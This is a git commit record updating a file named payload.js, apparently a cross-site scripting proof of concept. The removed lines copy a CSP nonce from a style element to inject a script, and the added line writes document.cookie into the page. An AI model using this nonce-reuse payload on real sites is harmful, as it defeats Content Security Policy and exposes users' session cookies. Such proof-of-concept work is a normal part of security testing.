48f3f868455be9eb489219e4bcd685a228dacbd5
rishaldwivedi <rishal.dwivedi@gmail.com>
2025-06-25 04:50:15 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,5 +1,1 @@
-let nonce = document.querySelector("style[nonce]")?.getAttribute("nonce");
-let s = document.createElement("script");
-s.setAttribute("nonce", nonce);
-s.innerHTML = "document.body.innerHTML += '<h1>' + document.cookie + '</h1>';";
-document.body.appendChild(s);
+document.body.innerHTML += "<h1>" + document.cookie + "</h1>";
